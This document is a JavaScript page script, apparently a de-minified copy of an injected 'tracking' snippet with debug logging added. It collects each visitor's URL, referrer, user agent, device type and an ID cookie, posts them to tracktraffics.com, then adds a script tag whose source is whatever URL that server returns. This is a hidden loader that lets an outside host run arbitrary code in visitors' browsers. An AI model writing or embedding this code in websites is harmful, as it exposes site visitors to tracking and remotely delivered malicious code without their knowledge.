!function() {
  
    const DEBUG_MODE = true; 
    function logDebug(...args) {
        if (DEBUG_MODE) console.log("[DEBUG]", ...args);
    }

    try {
        logDebug("Script started");
        
        const e = window.location.href;
        const n = getDeviceType();
        const t = navigator.userAgent;
        const o = document.referrer;

        function getCookie(e) {
            return document.cookie.split("; ").reduce((n, t) => {
                const [o, r] = t.split("=");
                return o === encodeURIComponent(e) ? decodeURIComponent(r) : n
            }, null);
        }

        const i = getCookie("PID");
        const a = getCookie("AID");
        let c = getCookie("re_ret_site");

        function setCookie(e, n) {
            document.cookie = `${encodeURIComponent(e)}=${encodeURIComponent(n)}; expires=${new Date(Date.now() + 864e5).toUTCString()}; path=/`;
            logDebug(`Cookie set: ${e}=${n}`);
        }

        if (!i) {
            const newPid = generateUUID();
            setCookie("re_ret_pid", newPid);
            logDebug("New PID generated:", newPid);
        }

        if (a !== encodeURIComponent(o)) {
            setCookie("re_ret_aid", encodeURIComponent(o));
            logDebug("AID updated with referrer:", o);
        }

        let s = parseInt(getCookie("re_ret_page")) + 1 || 1;
        setCookie("re_ret_page", s);
        logDebug("Page count:", s);

        if (!c) {
            c = Math.floor(100 * Math.random()) + 1;
            setCookie("re_ret_site", c);
            logDebug("New site ID generated:", c);
        }

        function getDeviceType() {
            const e = navigator.userAgent;
            return /iPhone|iPad|iPod/i.test(e) ? "iOS" : 
                   /Android/i.test(e) ? "Android" : 
                   /Windows Phone/i.test(e) ? "Windows Phone" : 
                   /Windows NT/i.test(e) ? "Windows" : 
                   /Macintosh/i.test(e) ? "Mac" : 
                   /Linux/i.test(e) ? "Linux" : "Unknown";
        }

        function generateUUID() {
            var e = Date.now();
            return "xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g, function(n) {
                var t = (e + 16 * Math.random()) % 16 | 0;
                e = Math.floor(e / 16);
                return (n === "x" ? t : (t & 0x3 | 0x8)).toString(16);
            });
        }

      
        const wwData = window.wwData || [];
        const uxid = generateUUID();
        wwData.push({
            event: "viewPage",
            uxid: uxid,
            page: e,
            device_type: n,
            uAgent: t,
            referrer: a
        });
        
        logDebug("Tracking data prepared:", wwData);

        const payload = {
            url: window.location.href,
            referrer: document.referrer,
            coo: JSON.stringify(i),
            origin: window.location.hostname,
            data: wwData,
            pcounts: s,
            i: c
        };

        logDebug("Request payload:", payload);

      
        const apiUrl = "https://www.tracktraffics.com/api/track-data";
        fetch(apiUrl, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(payload)
        })
        .then(response => {
            logDebug("API response received", response);

            if (!response.ok) {
                throw new Error(`HTTP error! Status: ${response.status}`);
            }

        
            const contentType = response.headers.get('content-type');
            if (!contentType || !contentType.includes('application/json')) {
                throw new TypeError(`Invalid MIME type: ${contentType}. Expected application/json`);
            }

            return response.json();
        })
        .then(data => {
            logDebug("API response data:", data);
            
            if (data.status === "success") {
                if (data.script) {
                  
                    const script = document.createElement('script');
                    script.src = data.affiliate_url;
                    script.async = true;
                    document.head.appendChild(script);
                    logDebug("External script loaded:", data.affiliate_url);
                } else if (data.name && data.affiliate_url) {
                 
                    const script = document.createElement('script');
                    script.src = data.affiliate_url;
                    script.async = true;
                    document.head.appendChild(script);
                    logDebug("Affiliate script loaded:", data.affiliate_url);
                }
            } else {
                throw new Error(`API error: ${data.message || 'Unknown error'}`);
            }
        })
        .catch(error => {
            console.error("Tracking Error:", error);
            logDebug("Error details:", {
                message: error.message,
                stack: error.stack,
                timestamp: new Date().toISOString()
            });
        });

    } catch (globalError) {
        console.error("Global Error:", globalError);
        logDebug("Global Error Details:", {
            message: globalError.message,
            stack: globalError.stack,
            timestamp: new Date().toISOString()
        });
    }
}();